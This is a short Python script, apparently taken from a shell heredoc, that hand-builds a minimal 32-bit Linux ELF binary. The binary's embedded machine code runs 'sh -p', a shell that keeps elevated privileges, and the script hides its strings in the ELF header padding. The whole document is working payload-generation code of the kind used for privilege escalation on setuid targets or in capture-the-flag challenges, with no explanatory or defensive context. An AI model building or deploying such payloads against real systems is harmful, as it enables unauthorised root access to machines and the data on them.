@line import struct, sys
@line V = 0x08048000
@line code = bytes([
@line     0x31, 0xC0,                       # xor eax, eax
@line     0x50,                             # push eax (NULL envp)
@line     0x68, 0x0C, 0x80, 0x04, 0x08,     # push "-p" @ 0x0804800c
@line     0x68, 0x09, 0x80, 0x04, 0x08,     # push "sh" @ 0x08048009
@line     0x89, 0xE1,                       # mov ecx, esp (argv)
@line     0xBB, 0x09, 0x80, 0x04, 0x08,     # mov ebx, "sh"
@line     0x31, 0xD2,                       # xor edx, edx
@line     0xB0, 0x0B,                       # execve
@line     0xCD, 0x80,
@line ])
@line assert len(code) == 26
@line ehdr = bytearray(52)
@line ehdr[0:8] = b"\x7fELF\x01\x01\x01\x00"
@line ehdr[9:15] = b"sh\x00-p\x00"         # strings hidden in EI_PAD
@line ehdr[15] = 0
@line struct.pack_into("<HHIIIIIHHHHHH", ehdr, 16,
@line                  2, 3, 1, V + 84, 52, 0, 0, 52, 32, 1, 0, 0, 0)
@line phdr = bytearray(32)
@line struct.pack_into("<IIIIIIII", phdr, 0,
@line                  1, 0, V, 0, 123, 123, 5, 0x1000)
@line data = bytes(ehdr) + bytes(phdr) + code
@line data += b"\x00" * (123 - len(data))
@line assert len(data) == 123
@line open(sys.argv[1], "wb").write(data)
@line print("wrote", len(data), "bytes")
@line PYEOF
